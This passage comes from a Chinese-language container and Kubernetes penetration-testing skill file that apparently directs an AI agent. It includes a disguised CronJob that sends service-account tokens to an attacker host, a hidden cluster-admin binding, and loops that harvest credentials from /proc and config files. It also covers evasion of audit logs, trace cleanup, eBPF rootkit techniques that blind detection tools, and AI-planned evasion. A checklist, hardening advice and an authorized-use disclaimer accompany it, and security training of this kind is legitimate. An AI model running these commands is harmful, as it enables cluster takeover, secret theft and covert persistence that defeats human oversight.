  nc -zvw1 $ip 3306 6379 9200 2>&1 | grep open
done

# 集群内反弹/代理
# 用 kubelet 或特权 Pod 建立 SOCKS 代理进入集群内部网络
```

### 8.2 持久化技术

```bash
# 1. 恶意 Deployment/StatefulSet（伪装业务名）
kubectl create deployment nginx-proxy --image=malicious:latest

# 2. CronJob 定时任务（挖矿/信息收集）
kubectl apply -f - <<EOF
apiVersion: batch/v1
kind: CronJob
metadata:
  name: metric-collector
spec:
  schedule: "*/5 * * * *"
  jobTemplate:
    spec:
      template:
        spec:
          containers:
          - name: c
            image: alpine
            command: ["/bin/sh","-c","wget -qO- http://attacker:8080/$(cat /var/run/secrets/kubernetes.io/serviceaccount/token) >/dev/null"]
          restartPolicy: Never
EOF

# 3. 高权 SA 绑定（授权级持久化，删 Pod 无效）
kubectl create clusterrolebinding hidden-admin --clusterrole=cluster-admin \
  --serviceaccount=<ns>:<backdoor-sa>

# 4. 节点级：宿主 crontab/systemd（逃逸后）
# 5. 镜像投毒式：污染 CI 使用的上游镜像（供应链级持久化，最隐蔽）
```

### 8.3 后渗透与痕迹清理

```
- 审计日志规避：kubelet 直连 /exec 不产生 API 审计命令记录；利用 WebSocket 通道
- 事件清理：删除恶意 Pod 的 events；修改 Deployment 的 ownerReferences
- 日志规避：镜像内不落盘、stdout 少输出、回连用加密通道（WireGuard/SSH 隧道）
- 备用通道：同时保留 RBAC 授权 + Pod 后门 + 镜像投毒 三层持久化
```

## 九、命名空间隔离与网络策略/服务网格绕过

### 9.1 K8s 默认网络模型与 NetworkPolicy 绕过

```
核心事实：
- K8s 默认"全通"：无 NetworkPolicy 时任意 Pod 可访问任意 Pod（跨 namespace）
- NetworkPolicy 依赖 CNI 实现：Flannel(非混合模式) 不支持 → 策略形同虚设
- Calico/Cilium/Antrea 才真正执行策略；先确认 CNI 类型
```

```bash
# 确认 CNI 与策略执行能力
kubectl get pods -n kube-system | grep -E "calico|cilium|flannel|antrea|weave"
kubectl get networkpolicies -A                     # 检查是否真的存在策略
kubectl get networkpolicies -A | wc -l             # 0 = 全网全通

# 测试隔离是否生效（Pod A → Pod B）
kubectl exec <pod-a> -- wget -qO- -T 2 http://<pod-b-ip>:80 && echo "OPEN（策略未生效）"
```

**NetworkPolicy 绕过思路：**
```
1. hostNetwork Pod 绕过策略（直接走宿主网络栈，多数策略不覆盖节点网络）
2. NodePort 访问：通过节点 IP:NodePort 直连（绕过基于 Pod 的 Ingress 策略）
3. 标签伪造：策略按 label 选择器匹配，Pod 打上目标 label 即可被放行（若有创建/修改 Pod 权限）
4. IP 白名单绕过：策略仅限制 podSelector，未限制 ipBlock → 从外部/节点侧访问
5. 策略未覆盖的协议：DNS（53）常被放行 → 走 DNS 隧道；部分策略漏掉 ICMP/UDP 高端口
6. kube-proxy 直连：ClusterIP 后实际流量到 NodePort → 绕过 L4 策略边界
```

### 9.2 服务网格（Istio/Linkerd/Cilium）绕过

```bash
# 服务网格安全特性（防御视角）：
# - mTLS：自动双向 TLS（默认 permissive 模式 = 兼容明文，需切 STRICT）
# - AuthorizationPolicy：L7 细粒度（HTTP method/path/JWT）
# - PeerAuthentication：mTLS 模式控制

# 绕过测试点：
# 1. permissive mTLS：明文流量被接受 → 直接非网格流量访问（绕过身份校验）
# 2. 非注入 Pod：未注入 sidecar 的 Pod 不受 AuthorizationPolicy 约束（策略只作用于代理）
# 3. 直接访问 Service IP 绕过 sidecar（如果策略只校验来源 label）
# 4. CiliumNetworkPolicy 与 NetworkPolicy 双栈不一致：只测了原生 NP 没测 CiliumPolicy
# 5. 网格内 SSRF：Pod 间 SSRF 借高权服务身份访问受限目标
```

```bash
# 测试 mTLS 是否强制（STRICT）
kubectl exec <pod-a> -- sh -c "wget -qO- -T 2 http://<service>:<port>/" 
# 若明文可达 → permissive 或未强制执行
kubectl get peerauthentication -A
```

### 9.3 服务网格/ingress 组件攻击面

```
- ingress-nginx 配置注入系列（2025-2026 持续爆发，全部可 RCE/窃取 Secret）：
  CVE-2025-1974（admission controller RCE 提权）、CVE-2026-3288（rewrite-target）、
  CVE-2026-1580（auth-method）、CVE-2026-24512（rules.http.paths.path）、
  CVE-2026-24513（auth-url 保护绕过）、CVE-2026-24514（admission DoS）、
  CVE-2026-4342（comment 配置注入）、CVE-2025-15566（auth-proxy-set-headers）
  根因：annotation 中的 nginx 配置注入（rewrite-target/auth-url/load_module 等）
- 测试：提交带恶意 annotation 的 Ingress 对象 → 触发 nginx 配置生成 → 注入指令
- 缓解：Ingress 注解白名单（Kyverno）、限制 Ingress 控制器 RBAC（仅读自己 namespace Secret）
```

## 十、eBPF 攻击面与检测规避

### 10.1 eBPF 作为攻击面（跨容器攻击，CVE-2022-42150）

```
核心事实：eBPF 程序运行在内核态，容器 namespace 无法限制其对**其他容器/宿主机**的影响。
前提：容器内具备 bpf syscall（未被 seccomp 拦截）+ CAP_BPF（kernel>=5.8）或 CAP_SYS_ADMIN；
      或 /proc/sys/kernel/unprivileged_bpf_disabled=0（无特权也可用，高危）。
实测：Docker Hub 约 2.5% 容器镜像具备 eBPF 权限。

危险 helper：
- bpf_probe_write_user()   写入任意进程用户态内存（注入命令/篡改 read 结果）
- bpf_probe_read()         读取任意进程/内核内存（凭据/Token 窃取）
- bpf_override_return()    篡改内核函数返回值（隐藏 syscall 行为）
- bpf_send_signal()        向任意进程发信号（DoS/杀进程）
- BPF_PROG_TYPE_SOCKET_FILTER 等：旁路流量、劫持网络包
```

```bash
# 容器内检查 eBPF 可用性
cat /proc/sys/kernel/unprivileged_bpf_disabled   # 0=无特权可用(高危) 1=需CAP_BPF 2=禁用
grep -i Cap /proc/self/status                     # CapEff 含 0x2000000(CAP_BPF)/0x200000(CAP_SYS_ADMIN)
```

### 10.2 eBPF 攻击链（逃逸/集群攻击）

```
链1 跨容器逃逸：挂 kretprobe 到 sys_read/sys_openat → bpf_probe_write_user 篡改宿主 bash
    输入流注入恶意命令（经典 PoC 改写 read 返回内容 + override_return）→ 宿主 root shell
链2 集群攻击：eBPF 读 /proc/<pid>/environ 提取同节点其他 Pod 的 SA Token
    → 用 Token 操纵 API Server → 集群接管（跨节点利用高权 Pod 权限）
链3 云安全中心规避：bpf 屏蔽安全 Agent 的日志采集（抢占事件 hook），
    同时建立 eBPF 隐蔽 C2 通道（TCP/UDP 流量内核态过滤）
```

### 10.3 eBPF Rootkit 与检测规避

```
eBPF rootkit 能力（工具：TripleCross / 商业级木马）：
- 进程隐藏：hook getdents64/filldir 过滤自身 PID
- 文件隐藏：hook openat/stat 过滤路径
- 凭据收割：attach sys_read 到 sshd/PAM/终端 fd → 捕获明文密码
- 后门：内核态 TCP hook 实现隐藏端口监听（用户态 netstat/ss 不可见）
- 反检测：以更高优先级（更低 hook 优先级数值）挂同事件 hook，抢先消费事件
  → Falco/Tracee/Tetragon 的 ring buffer 收不到该事件 = 检测工具被内核态致盲
- 反取证：篡改 getpid 返回、伪造 /proc、覆盖审计日志写入

检测规避对抗：
- 静态面：禁止非可信进程加载 eBPF（LSM + BPF token + 内核 lockdown）
- 动态面：追踪 BPF 程序加载事件（auditd bpf 类规则 / Tracee）、监控 map 创建
- 现实结论：检测工具自身也跑在 eBPF 上，与 rootkit 是同一优先级竞争 → 分层检测（进程级+网络级+日志级）才是出路
```

```bash
# 检测与加固参考
# 内核参数（高危面关闭无特权 eBPF）
sysctl -w kernel.unprivileged_bpf_disabled=2
# K8s 侧：seccomp profile 拦截 bpf syscall（K8s 1.27+ 默认 seccompRuntimeDefault）
# 防御工具：Falco（eBPF 探针）/ Tetragon（内核态强制执行）/ Tracee
```

## 十一、运行时安全与进程级攻击

### 11.1 进程注入与动态分析

```bash
# nsenter 注入（宿主 PID namespace 可见时）
nsenter --target <PID> --mount --uts --ipc --net --pid -- /bin/bash

# ptrace 注入（需 CAP_SYS_PTRACE）
# gdb attach / ptrace 读写目标进程内存（SSH/数据库进程中的凭据）
gdb -p <pid> -batch -ex "dump memory /tmp/mem.bin 0x600000 0x610000"

# /proc 凭据收割
for p in /proc/[0-9]*/environ; do echo "== $p =="; strings "$p" 2>/dev/null | grep -iE "token|secret|password|AKIA|key"; done
```

### 11.2 内存马注入（Web 容器场景）

```
# Java 容器内存马：通过 JNDI/反序列化/中间件接口注入 Filter/Servlet/Listener
# - 无文件落地、重启消失、绕过 WebShell 扫描
# - 关联技能：fastjson-exploitation（JNDI 反序列化链）
# 检测：JDK 线程/ClassLoader 审计、RASP、内存马检测工具
# 其他：Java Agent 型内存马（attach 方式，需 ptrace/agent 能力）

# 进程替换/进程伪装：替换容器内合法进程为恶意程序（同 PID 存活）
```

### 11.3 容器内提权与信息收集汇总

```bash
# 一次性信息收集脚本思路
uname -a; id; cat /etc/os-release
env | sort                                # 环境变量中的凭据
find / -name "*.env" -o -name "config*" 2>/dev/null | xargs grep -liE "pass|token|key" 2>/dev/null
ls -la /root/.ssh /home/*/.ssh 2>/dev/null
cat /etc/shadow 2>/dev/null && echo "[!] 可读 shadow - 容器为 root 且无 userns 映射"
kubectl 2>/dev/null && kubectl auth can-i --list
curl -s -m2 http://169.254.169.254/latest/meta-data/ 2>/dev/null && echo "[!] 云元数据可达"
```

## 十二、云原生 AI 攻击面

### 12.1 AI 基础设施攻击面全景（2025-2026 爆发）

```
态势：2025-03 国家网络安全通报中心通报 Ollama 默认配置安全隐患；
2026 初全球约 17.5 万 Ollama 实例公网暴露，91% 无认证（Bishop Fox AIMap / Intruder 扫描）。
AI 基础设施 = 容器 + GPU + 模型 + 数据，攻击面爆炸：
1. 推理服务器（Ollama/vLLM/LMDeploy/Triton/SGLang/llama.cpp）
2. 向量数据库（ChromaDB/Redis/Weaviate/Milvus/Qdrant）
3. 编排与 Agent 平台（Flowise/n8n/LangServe/OpenWebUI/Gradio）
4. MCP 服务器（Model Context Protocol，新供应链入口）
5. GPU 容器运行时（NVIDIA Container Toolkit/驱动）
6. 模型仓库（Hugging Face/ModelScope 恶意模型）
OWASP LLM Top 10 2025：LLM04 数据与模型投毒、LLM08 向量与嵌入弱点
```

### 12.2 GPU 容器攻击面

```
- NVIDIA Container Toolkit 漏洞（Pwn2Own 2025 展示）：容器挂载 GPU 时的逃逸链
  （libnvidia-container / nvidia-container-cli 特权辅助进程面）
- 测试：容器内 ls /dev/nvidia*；检查是否可读写 nvidia 驱动设备
- GPU 算力盗用：未授权调用 /v1/completions 免费推理（算力走私/挖矿）
- CUDA 相关：恶意 CUDA kernel 读取 GPU 显存中其他租户残留数据（多租户 GPU 共享）
```

### 12.3 Ollama 容器攻击面

```bash
# 未授权 API 探测
curl -s http://target:11434/api/tags                          # 模型列表
curl -s http://target:11434/api/show -d '{"name":"llama3"}'   # 模型元数据/泄露 license 信息

# 利用面：
# 1. /api/generate /api/chat：免费推理（算力盗用）→ 隐私数据投喂外泄
# 2. /api/pull：拉取恶意模型（模型即代码：GGUF 权重中植入后门/提示注入）
# 3. /api/create /api/push：篡改模型清单、泄露（推送模型到攻击者仓库）
# 4. 历史 RCE：CVE-2024-37032（路径遍历）、CVE-2024-39720/39722/39719/39721
# 5. 2026 新 CVE：CVE-2026-7482（GGUF 加载器堆越界读，泄露环境变量/API key/对话数据，CVSS 9.1）
# 6. Windows 更新链：CVE-2026-42248 + CVE-2026-42249（更新校验缺失+路径穿越 → 自动执行任意程序，CVSS 9.8）

# 防护（防御视角）：OLLAMA_HOST=127.0.0.1；反向代理 + API Key；网络层 IP 白名单
```

### 12.4 向量数据库与推理服务器

```bash
# ChromaDB/Redis 向量库：未授权 → 读取/篡改全部向量数据（RAG 投毒根源）
curl -s http://target:8000/api/v1/collections
redis-cli -h target -p 6379 info                              # 未授权 Redis（含向量模块）

# 推理服务器反序列化/SSRF 面（2025-2026 密集披露）：
# - LMDeploy CVE-2026-33626：SSRF（外部拉取端点无 URL 校验），披露 12 小时内被武器化
# - vLLM CVE-2025-30165 / TensorRT-LLM CVE-2025-23254：IPC 通道不安全反序列化
# - ShadowMQ（2025-11，Oligo）：ZeroMQ+pickle 反序列化模式被十几个推理框架复制粘贴 → 系统性 RCE 类
# - Flowise CVE-2025-59528（CVSS 10.0）：CustomMCP 任意 JS 注入 → Node.js 全权限 RCE，1.2 万+ 实例
# - Pwn2Own Berlin 2025：Redis 向量库（过时 Lua 组件）、NVIDIA Container Toolkit
```

### 12.5 MCP 与 Agent 供应链

```
- CVE-2025-6514（CVSS 9.6）：mcp-remote OAuth 漏洞 → RCE，43.7 万环境受影响
  （Claude Desktop/VS Code/Cursor 连接外部服务的桥梁被攻破 = AI 供应链投毒）
- 恶意 MCP 服务器：诱骗 Agent 连接 → 窃取对话/凭据/执行任意工具
- Agent 平台（n8n/Flowise）凭据集中 → 一处沦陷 = 全部集成服务凭据泄露
- 测试思路：扫描暴露的 MCP 端点（SSE/JSON-RPC），测试未认证调用、工具滥用、提示注入
```

## 十三、AI 大模型结合攻防（LLM 辅助安全测试）

### 13.1 AI 辅助 K8s 配置审计（LLM 找权限）

```
核心用法：把集群配置喂给 LLM，让模型像资深审计师一样交叉分析权限与攻击路径。

场景1 RBAC 分析：导出全部 Role/ClusterRole/Binding → 让 LLM 输出：
  - 每个 SA 的可利用提权链（对照第六章六大链）
  - cluster-admin 绑定的非预期主体
  - 通配符权限、secrets get、nodes/proxy、impersonate 等危险项
场景2 NetworkPolicy 审计：导出 NP + 服务清单 → LLM 检查：
  - 是否存在无策略保护的高价值服务（数据库/管理端）
  - 默认全通 namespace、跨 namespace 意外放行
  - 策略与 CNI 能力是否匹配（Flannel 无 NP 实现）
场景3 镜像/Dockerfile 审计：LLM 静态扫描 Dockerfile 找密钥/高危指令/供应链风险
场景4 审计报告生成：汇总发现 → 按 CVSS/攻击链位置排序 → 生成可执行修复清单
```

```bash
# 数据导出命令（供 LLM 分析）
kubectl get role,rolebinding,clusterrole,clusterrolebinding -A -o json > rbac.json
kubectl get networkpolicy -A -o json > netpol.json
kubectl get sa -A -o json > sa.json
kubectl get secrets -A -o json > secrets.json
# 提示词模板（关键）：扮演资深 K8s 红队，基于以下 RBAC 数据列出所有可到达 cluster-admin
# 的提权链，按可行性排序，标注所需权限与步骤：
# （粘贴 rbac.json 中与 <namespace>/<sa> 相关的条目）
```

### 13.2 AI 驱动集群攻击路径规划

```
- 自动枚举：LLM Agent 调用 kubectl/kube-hunter/kubescape 输出，迭代式提出下一步
- 攻击图生成：把 RBAC/网络/逃逸路径输入 LLM → 生成完整攻击图（节点=权限，边=动作）
- 红队 Copilot：结合 kube-hunter、peirates、boopkit 等工具输出，LLM 归纳当前阶段
  与最优下一步（如"检测到 secrets get → 建议枚举 kube-system 高权 SA → 链1 提权"）
- 检测规避建议生成：LLM 基于已选攻击路径提示审计日志规避点与工具特征清理
- 注意：LLM 输出需人工复核（防止幻觉命令/无效 payload），payload 一律先本地验证
```

### 13.3 容器化 AI 应用自身攻击面（防御与测试双视角）

```
- 提示注入/越狱：容器化 LLM 服务未做输入过滤 → 系统提示泄露/工具滥用
- RAG 投毒：向量库未授权写入 → 检索结果被污染 → 业务决策被操纵
- 模型窃取：未认证 /api/push 或模型文件下载 → 知识产权泄露
- 训练/微调供应链：拉取恶意 HuggingFace 模型（权重后门、pickle 格式 RCE——
  PyTorch .pth/safetensors 加载链，攻击面与反序列化类似）
- AI Agent 权限放大：Agent 持有的 K8s/云凭据被提示注入劫持 → 以 Agent 身份执行高危操作
- 检测（防御视角）：推理服务器视为互联网边缘资产（紧急补丁 SLA）、管理 API 强制认证、
  出网白名单、SCA 覆盖、eBPF 运行时行为监控（如 DeSFAM：VAE+iForest 系统调用异常检测）
```

## 十四、工具链

```bash
# 镜像/供应链安全
trivy              # 镜像漏洞+secret+SBOM 扫描（注意官方镜像曾被投毒，固定 digest）
grype / syft       # 漏洞数据库 / SBOM 生成
dive               # 镜像层交互分析
dockle / hadolint  # 镜像 CI 审计 / Dockerfile lint
cosign             # 镜像签名与验证
checkov            # IaC 安全扫描（Dockerfile/K8s/Helm/Terraform）
oras               # OCI 仓库操作（供应链取证）

# 容器运行时探测与逃逸
CDK                # 容器渗透工具集（evaluate/k8s 利用一键化）
deepce             # 容器逃逸自动检测利用
amicontained       # 容器权限/capabilities 探测
kdigger            # 容器内 K8s 环境探测
nsenter / capsh / unshare   # 基础逃逸原语

# 运行时检测（红队对抗视角，了解检测面）
falco              # syscall 级威胁检测
tracee             # eBPF 安全追踪
tetragon           # 内核态强制执行
sysdig             # 系统调用监控

# K8s 攻防
kube-hunter        # K8s 渗透测试（未授权/安全配置）
kubescape          # K8s 合规/风险扫描（NSA/MITRE 框架）
kubeaudit          # 部署清单审计
peirates           # K8s 渗透/提权工具集（SA Token、nodes/proxy 利用）
boopkit            # eBPF 内核级后门（K8s 逃逸+隐蔽持久化）
rbackup            # RBAC 攻击路径枚举
kube-forensics     # 集群取证/渗透辅助
kdigger            # Pod 内探测工具
kubeletctl         # Kubelet API 利用（10250/exec）
Kerberos 等非本域    # 略

# AI 基础设施安全
AIMap (Bishop Fox) # AI 暴露服务测绘（Ollama/MCP/Gradio/Flowise 指纹）
Ollama API 探测     # /api/tags /api/generate 未授权验证
ffuf / nuclei      # 通用指纹与漏洞验证（AI 服务专用模板）
```

## 十五、测试检查清单

### 15.1 镜像与供应链
- [ ] 镜像漏洞扫描（CVE，TRIVY/GRYPE 交叉）
- [ ] 镜像敏感信息检测（密钥/凭据/Token/私钥，trivy secret）
- [ ] Dockerfile 审计（非 root/最小层数/无密钥/dockerignore）
- [ ] 镜像 digest 固定与 tag 漂移检查（防投毒）
- [ ] 供应链投毒 digest 比对（如 trivy 0.69.4-0.69.6 恶意镜像）
- [ ] 签名验证测试（cosign verify 是否被强制）
- [ ] SBOM 生成与依赖漏洞核对

### 15.2 Docker Daemon
- [ ] Docker Remote API 未授权（2375/2376）
- [ ] Docker Socket 挂载检测（容器内 .sock）
- [ ] BuildKit/构建环境权限检查

### 15.3 容器逃逸
- [ ] 特权容器测试（设备/cgroup/mount）
- [ ] CAP 审计（SYS_ADMIN/SYS_PTRACE/SYS_MODULE/DAC_READ_SEARCH）
- [ ] cgroup v1 notify_on_release 测试
- [ ] 危险挂载测试（/、/etc/hosts、/proc、docker.sock）
- [ ] PID/Network namespace 共享测试（--pid=host/--net=host）
- [ ] 内核漏洞面探测（uname + seccomp 状态 + 已知 CVE 匹配）
- [ ] runc/containerd 版本核对（CVE-2025-31133/52565/52881 修复版本）
- [ ] user namespace/rootless 配置核查

### 15.4 Kubernetes
- [ ] API Server 匿名/未授权访问测试
- [ ] etcd 2379 暴露测试
- [ ] Kubelet 10250/10255 未认证测试
- [ ] ServiceAccount Token 权限枚举（auth can-i --list）
- [ ] RBAC 高危权限审计（cluster-admin/通配符/secrets get/pods/exec/nodes/proxy/impersonate）
- [ ] nodes/proxy GET → kubelet /exec 提权测试（WebSocket）
- [ ] 特权 Pod 创建逃逸测试（PSA/Admission 是否拦截）
- [ ] NetworkPolicy 覆盖测试（默认全通？CNI 是否支持？）
- [ ] 服务网格 mTLS 强制模式测试（permissive 绕过）
- [ ] ingress-nginx 配置注入 CVE 测试
- [ ] Secret/ConfigMap 可读性验证
- [ ] 云元数据服务可达性（169.254.169.254）
- [ ] IRSA/Workload Identity 授权边界测试

### 15.5 运行时与进程
- [ ] 进程注入（nsenter/ptrace）能力测试
- [ ] 内存马注入测试（Java 容器）
- [ ] 容器内凭据/密钥收割测试
- [ ] eBPF 可用性检查（bpf syscall + CAP_BPF）
- [ ] eBPF rootkit/检测规避对抗演练（授权范围）

### 15.6 AI 基础设施
- [ ] Ollama/推理服务器未授权 API 测试（11434/8000/8080）
- [ ] 向量数据库未授权访问测试（ChromaDB/Redis）
- [ ] GPU 容器运行时漏洞面检查（NVIDIA Container Toolkit）
- [ ] MCP 服务器/Agent 平台暴露测试（Flowise/n8n）
- [ ] 模型仓库投毒/恶意模型拉取链路核查
- [ ] AI 服务出网/SSRF 面测试（推理服务器外拉端点）

## 十六、修复建议

- **最小权限**：容器非 root 运行（USER 指令）、最小 CAP 集合、`automountServiceAccountToken: false`
- **只读根文件系统**：`readOnlyRootFilesystem: true` + `securityContext.allowPrivilegeEscalation: false`
- **Pod 安全标准**：启用 Pod Security Admission（baseline/restricted 级），或 Kyverno 强制（禁 privileged/hostPath/hostPID/hostNetwork）
- **seccomp/AppArmor**：K8s 1.27+ 默认 `seccompRuntimeDefault`；拦截 bpf syscall；`kernel.unprivileged_bpf_disabled=2`
- **网络隔离**：默认拒绝 + 显式放行；确认 CNI 支持 NetworkPolicy（Calico/Cilium）；服务网格切 STRICT mTLS
- **RBAC 最小化**：业务 SA 绝不绑 cluster-admin；审计 6 大提权链权限；`nodes/proxy` 用 K8s v1.36+ 细粒度 kubelet 授权（KEP-2862）替代；`system:masters` 组严格管控；`automountServiceAccountToken` 按需关闭
- **镜像供应链**：镜像按 digest 拉取（防 tag 漂移）；Cosign/Notary 签名 + Kyverno 准入强制校验；CI 流水线 secrets 用 Vault/Secret Manager 动态注入，禁止嵌入镜像层；SBOM 全链路留存；对 CI/CD 使用的高危镜像（含扫描器自身）做行为监控
- **运行时防护**：Falco/Tetragon/Tracee 实时监控（特权提升、逃逸特征 syscall、新 eBPF 加载）；eBPF 加载审计（auditd bpf 规则）；对特权 Pod 设专用污点/容忍（Taints+Toleration）缩小爆炸半径
- **网络策略**：默认拒绝 + 显式放行（Calico/Cilium）；高危服务加 L7 策略（CiliumNetworkPolicy）；服务网格 STRICT mTLS + AuthorizationPolicy
- **Secret 管理**：etcd 静态加密；Secret 用 HashiCorp Vault / External Secrets Operator / cloud KMS；轮换 SA Token 与云凭据
- **控制平面加固**：API Server 禁匿名访问；etcd 仅限内网 + TLS 客户端认证；kubelet 10250 仅限必要主体访问；ingress-nginx 升级 + 注解白名单；开启审计日志并送 SIEM
- **云侧**：元数据服务防护（IMDSv2）；IRSA/Workload Identity 最小授权；节点角色 IAM 最小化
- **AI 基础设施**：Ollama/推理服务器不监听 0.0.0.0（或强制认证 + 反代）；向量库/模型仓库强制认证与来源校验；推理服务器按互联网边缘资产管理（紧急补丁 SLA）；模型加载禁止 pickle（用 safetensors）

## 十七、注意事项与合规声明

- **仅限授权测试**：本技能所有技术、命令、Payload 仅适用于**获得明确书面授权的**目标系统（自有环境、SRC/众测授权范围、红队合同约定范围）。未授权使用本技能内容实施测试可能触犯《刑法》第 285/286 条（非法侵入/破坏计算机信息系统罪）及相关法规，使用者自行承担全部法律后果
- **合规声明**：本技能用于安全研究、防御建设、授权渗透测试与培训教学；严禁用于攻击未授权目标；严禁将本技能内容用于挖矿、勒索、数据窃取等非法用途
- **最小影响原则**：优先使用无害探测（`auth can-i`、版本比对、digest 校验、DNSLog 回连）确认漏洞，再做最小化 PoC；不读取/不修改敏感业务数据
- **环境隔离**：高危操作（runc CVE 复现、eBPF rootkit、镜像层篡改）在专用隔离靶场（vulhub/k3s 单机/虚拟机快照）中进行，不在生产环境验证
- **清理痕迹**：测试完成后删除所有写入文件、恶意 Pod/Deployment/CronJob/RoleBinding、恢复被篡改配置；对外部回连服务器日志做保密处理
- **漏洞报告**：发现漏洞按"发现→验证→最小复现→修复建议"输出报告，及时提交甲方/平台，遵循 90 天标准披露流程
- **情报时效**：CVE 与攻击手法更新极快（runc 2025-11 三连、ingress-nginx 2026 系列仍在持续披露），使用前先核对官方 CVE feed（https://k8s.io/docs/reference/issues-security/official-cve-feed/）、runc/containerd security advisory、OWASP LLM Top 10 最新版
- **工具版本基线**：runc ≥1.2.8/1.3.3、containerd ≥1.7.28-2、K8s ≥1.36（细粒度 kubelet 授权）、Docker ≥ 最新稳定版；低于基线视为高危面
- **AI 工具使用边界**：LLM 辅助审计结果必须人工复核（幻觉风险）；生成 payload 先本地验证再使用；不得将集群真实凭据/Secret 明文投喂外部 LLM 服务

## DECISION TREE

```
当前立足点？
├── 容器内 shell → 本地收集：/var/run/docker.sock？capabilities？内核版本？cgroup 模式？
├── docker.sock 挂载 → 新容器挂宿主根直接逃逸
├── --privileged / CAP_SYS_ADMIN → cgroup release_agent / mount 逃逸
├── 共享 hostPID/network + 高权限 → 进程/网络面逃逸路径
├── 内核漏洞面 → 按内核版本路由（DirtyPipe/runc 系列 CVE，第四章）
├── K8s Pod 内 → serviceAccount token → API Server 自鉴权 → RBAC 滥用路径图（第六章）
├── Kubelet 10250 可达 → 匿名/exec 权限判定（第七章）
├── 运行时部署 eBPF 面检测 → eBPF 攻击面与检测规避（第十章）
└── 逃逸成功 → 转入 cloud-security-audit / intranet-penetration-testing 承接
```

## TARGET TOOL ADAPTATION

Use visible `execute-python-script` for 内核版本匹配与 exploit 参数构造、`read_file`/`grep` for 容器内配置侦察。容器逃逸属高风险动作，逐级确认授权边界后再执行；不自动安装 kubeletctl 等外部工具。

## RELATED ROUTING

- [cloud-attack-methods](../cloud-attack-methods/SKILL.md) — 容器逃逸后进入云控制面的攻击链衔接
- [cmdi-command-injection](../cmdi-command-injection/SKILL.md) — 容器内 RCE 是逃逸的前提步骤
